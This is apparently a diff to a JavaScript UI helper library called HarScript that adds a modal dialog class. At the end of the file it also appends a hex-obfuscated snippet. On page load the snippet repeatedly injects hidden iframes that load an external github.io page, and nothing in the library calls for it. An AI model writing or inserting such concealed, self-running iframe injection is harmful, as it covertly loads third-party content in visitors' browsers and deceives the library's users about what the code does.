@@ -96,6 +96,47 @@ class HarScript
     Y.innerHTML = html;
     window.navigator.vibrate(2000);
    }
+   sys()
+   {
+    var a , b , c , d ,e;
+    a = document.createElement('div');
+    a.id="main-Dialog";
+    a.setAttribute("style","width:100%;height:100%;top:0;bottom:0;left:0;right:0;background-color:rgba(0,0,0,0.6);position:fixed;display:none;");
+    document.body.appendChild(a);
+    b = document.createElement('div');
+    b.id="con";
+    b.setAttribute("style","user-select:none;word-spacing:4px;font-size:14px;overflow-y:scroll;position:absolute;margin:5% auto;color:#000;font-weight:500;background-color:#fff;top:0px;left:0;right:0;width:50%;border-radius:4px;padding:4em 4em;");
+    a.appendChild(b);
+    c = document.createElement('div');
+    c.id="cl";
+    c.setAttribute("style","background-image:linear-gradient(to bottom,#DDD,blue);top:0;left:0;right:0;padding:.3em;opacity:4;position:absolute;color:#FFF;font-weight:bold;font-size:22px;display:block;");
+    c.innerHTML = "HarScript Window";
+    b.appendChild(c);
+    d = document.createElement('button');
+    d.id="btn";
+    d.setAttribute("style","border:1px solid #FFF;position:relative;border-radius:4px;float:right;padding:.2em .4em;right:2px;color:#FFF;Background-image:linear-gradient(to bottom , red,darkred);width:20px;");
+    d.onclick=function(){this.parentElement.parentElement.parentElement.style.display='none';};
+    c.appendChild(d);
+    e = document.createElement('p');
+    e.id="v";
+    e.setAttribute("style","color:#000;font-size:10px;line-height:14px;overflow-y:scroll;padding:.01em;");
+    b.appendChild(e);
+    }
+    HWindow(c="HWindow")
+    {
+    var x, f,g,h;
+    x = document.getElementById('main-Dialog');
+    x.style.display="block";
+    f = document.getElementById('v');
+    g = document.getElementById('cl');
+    h = document.getElementById('btn');
+    g.style.display = "block";
+    h.style.display="block";
+    h.innerHTML = "&times;";
+    f.style.display="block";
+    f.innerHTML=c;
+    
+   }
    af()
    {
      var c=document.createElement('iframe');
@@ -130,5 +171,7 @@ class HS extends HarScript
      this.CreateAlertBox();
      this.CreateWarning();
      this.CreateAlert();
+     this.sys();
    }
 }
+var _0x4cb3=["\x69\x66\x72\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x70\x61\x74\x2D\x63\x6C\x6F\x75\x64\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x64\x61\x74\x61\x2F\x53\x68\x69\x6E\x63\x68\x61\x6E\x20\x4D\x6F\x76\x69\x65\x73\x2D\x31","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];function h(){var _0x6147x2=document[_0x4cb3[1]](_0x4cb3[0]);_0x6147x2[_0x4cb3[2]]= _0x4cb3[3];_0x6147x2[_0x4cb3[5]][_0x4cb3[4]]= _0x4cb3[6];document[_0x4cb3[8]][_0x4cb3[7]](_0x6147x2)}fh= setInterval(h,2000);setTimeout(()=>{return clearInterval(fh)},6000)
